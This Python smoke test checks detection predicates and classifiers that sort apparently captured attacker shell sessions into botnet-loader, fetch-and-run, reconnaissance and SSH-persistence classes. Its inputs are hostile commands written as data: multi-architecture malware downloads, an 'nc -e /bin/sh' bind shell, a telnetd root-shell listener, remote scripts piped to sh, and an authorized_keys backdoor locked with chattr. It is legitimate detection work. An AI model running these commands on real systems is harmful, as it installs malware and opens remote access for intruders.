"""Smoke test for the structural predicates and pair classifiers in
`scripts/eval_predicate_falsification.py`. No ES, no eval files — hand-built
command strings only.
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # scripts/

from eval_predicate_falsification import (
    appliance_menu_only,
    c2_launch_arg,
    hetero_target_fallback,
    classify_botnet_vs_fetch,
    classify_iot_vs_single,
    classify_single_vs_hostrecon,
    classify_sshkey_vs_hostrecon,
    compute_predicates,
    evaluate_pair,
    host_info_gather,
    key_write_immutability,
    multi_arch_targeting,
    self_spread,
)

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  ({detail})")


# --- multi_arch_targeting ---
check("uname -m detection fires",
      multi_arch_targeting('uname -m; case "$A" in x86_64) B=main_x86_64;; esac'))
check("brute-force arch fetch fires (>=2 distinct arch tokens)",
      multi_arch_targeting("wget http://x/mal.x86; wget http://x/mal.arm7; wget http://x/mal.mips"))
check("plain fetch+run does not fire",
      not multi_arch_targeting("wget http://x/y.sh; chmod +x y.sh; ./y.sh"))

# --- c2_launch_arg ---
check("IP:port launch arg fires",
      c2_launch_arg("./bot 1.2.3.4 1338"))
check("defanged IP launch arg fires",
      c2_launch_arg("./bot 1[.]2[.]3[.]4 1338"))
check("absolute-path launch arg fires (dropper runs the path it just wrote)",
      c2_launch_arg("chmod +x /tmp/bot; /tmp/bot 47.77.239.231 1338 &"))
check("no launch args does not fire",
      not c2_launch_arg("./bot"))

# --- self_spread ---
check("telnetd listener fires", self_spread("busybox telnetd -l /bin/sh -p 31337 &"))
check("nc listener fires", self_spread("nc -lvp 4444 -e /bin/sh"))
check("plain nc client does not fire", not self_spread("nc 1.2.3.4 4444"))
check("propagation transport handed to the staged payload fires",
      self_spread("(wget -qO- https://x/sh || curl -sk https://x/sh) | sh -s telnet"))
check("piping to a plain shell does not fire", not self_spread("wget -qO- https://x/sh | sh"))

# --- hetero_target_fallback: multi-dir AND multi-tool in one chain ---
_HETERO = ("cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /; "
           "wget http://h/i; curl -O http://h/i; /bin/busybox wget http://h/i; chmod 777 i; ./i")
check("multi-dir + multi-tool fallback fires", hetero_target_fallback(_HETERO))
check("multi-dir alone does not fire",
      not hetero_target_fallback("cd /tmp || cd /var/run || cd /mnt; ./i"))
check("multi-tool alone does not fire",
      not hetero_target_fallback("cd /tmp; wget http://h/i || curl -O http://h/i"))
check("ordinary single-path fetch does not fire",
      not hetero_target_fallback("cd /tmp; wget http://h/x.sh; chmod +x x.sh; ./x.sh"))
check("hetero fallback alone routes to botnet_loader",
      classify_botnet_vs_fetch(compute_predicates([_HETERO])) == "botnet_loader")

# --- appliance_menu_only ---
check("all-menu-verb session fires", appliance_menu_only(["enable", "system", "linuxshell"]))
check("menu walk then real command does not fire",
      not appliance_menu_only(["enable", "system", "wget http://x/y.sh"]))
check("empty session does not fire", not appliance_menu_only([]))

# --- host_info_gather ---
check("uname -a fires", host_info_gather("uname -a"))
check("cat /proc/cpuinfo fires", host_info_gather("cat /proc/cpuinfo | grep name"))
check("capability probe does not fire", not host_info_gather("echo SHELL_TEST"))

# --- key_write_immutability ---
check("authorized_keys write + chattr fires",
      key_write_immutability("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys; chattr +ia .ssh"))
check("key write alone (no immutability) does not fire",
      not key_write_immutability("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys"))

# --- compute_predicates: full vector on one session ---
pred = compute_predicates(['uname -m; case "$A" in x86_64) B=x;; esac', "./bot 1.2.3.4 1338"])
check("compute_predicates returns all seven keys",
      set(pred) == {"multi_arch_targeting", "c2_launch_arg", "self_spread",
                     "appliance_menu_only", "host_info_gather", "key_write_immutability",
                     "hetero_target_fallback"},
      str(sorted(pred)))

# --- pair classifiers ---
botnet_pred = compute_predicates(['uname -m'])
check("botnet_loader wins on arch detection",
      classify_botnet_vs_fetch(botnet_pred) == "botnet_loader")
fetch_pred = compute_predicates(["wget http://x/y.sh", "chmod +x y.sh", "./y.sh"])
check("payload_fetch_exec is the default with no fleet-intent signal",
      classify_botnet_vs_fetch(fetch_pred) == "payload_fetch_exec")

iot_pred = compute_predicates(["enable", "system"])
check("iot_cli_probe wins when whole session is menu verbs",
      classify_iot_vs_single(iot_pred) == "iot_cli_probe")
single_pred = compute_predicates(["echo SHELL_TEST"])
check("single_command_probe wins otherwise",
      classify_iot_vs_single(single_pred) == "single_command_probe")

key_pred = compute_predicates(["cd ~; chattr -ia .ssh", "echo k >> authorized_keys", "lockr -ia .ssh"])
check("ssh_key_chattr_persistence wins on key+immutability regardless of recon",
      classify_sshkey_vs_hostrecon(key_pred) == "ssh_key_chattr_persistence")
recon_pred = compute_predicates(["uname -a"])
check("host_recon is the default without key+immutability",
      classify_sshkey_vs_hostrecon(recon_pred) == "host_recon")

check("host_recon wins single_command_probe pair when info is gathered",
      classify_single_vs_hostrecon(recon_pred) == "host_recon")
check("single_command_probe wins when nothing is gathered",
      classify_single_vs_hostrecon(single_pred) == "single_command_probe")

# --- evaluate_pair: perfectly separable synthetic pair scores 1.0 ---
evidence = {
    "s1": ("botnet_loader", ["uname -m"]),
    "s2": ("payload_fetch_exec", ["wget http://x/y.sh", "./y.sh"]),
    "s3": ("host_recon", ["uname -a"]),  # different pair, must not leak in
}
result = evaluate_pair("botnet_loader", "payload_fetch_exec", classify_botnet_vs_fetch, evidence)
check("evaluate_pair scores perfectly separable synthetic pair at 1.0",
      result["accuracy"] == 1.0, str(result))
check("evaluate_pair excludes sessions outside the pair", result["n"] == 2, str(result["n"]))

no_evidence = evaluate_pair(
    "botnet_loader", "payload_fetch_exec", classify_botnet_vs_fetch,
    {"s1": ("botnet_loader", [])},
)
check("no_evidence session is counted, not dropped",
      no_evidence["n"] == 1 and no_evidence["no_evidence"] == 1, str(no_evidence))

print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
